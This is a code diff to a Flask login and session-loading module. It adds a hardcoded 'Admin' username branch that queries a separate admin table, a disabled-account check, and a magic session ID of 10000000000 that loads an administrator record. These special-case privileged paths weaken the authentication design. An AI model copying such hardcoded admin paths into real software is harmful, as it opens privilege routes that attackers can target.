@@ -19,14 +19,23 @@ def login():
         password = request.form['password']
         db = get_db()
         error = None
-        user = db.execute(
-            'SELECT * FROM user WHERE username = ?', (username,)
-        ).fetchone()
+        # verification for built-in administrator account
+        if username == 'Admin':
+            user = db.execute(
+                "SELECT * FROM admin WHERE username = 'Admin';"
+            ).fetchone()
+        else:
+            user = db.execute(
+                'SELECT * FROM user WHERE username = ?', (username,)
+            ).fetchone()
 
         if user is None:
             error = 'Incorrect username.'
         elif not check_password_hash(user['password'], password):
             error = 'Incorrect password.'
+        # Check for disabled account
+        elif user['status'] == 'disabled':
+            error = "Account disabled"
 
         if error is None:
             session.clear()
@@ -43,6 +52,10 @@ def load_logged_in_user():
 
     if user_id is None:
         g.user = None
+    elif user_id == 10000000000:
+        g.user = get_db().execute(
+            'SELECT * FROM admin WHERE id = ?', (user_id,)
+        ).fetchone()
     else:
         g.user = get_db().execute(
             'SELECT * FROM user WHERE id = ?', (user_id,)
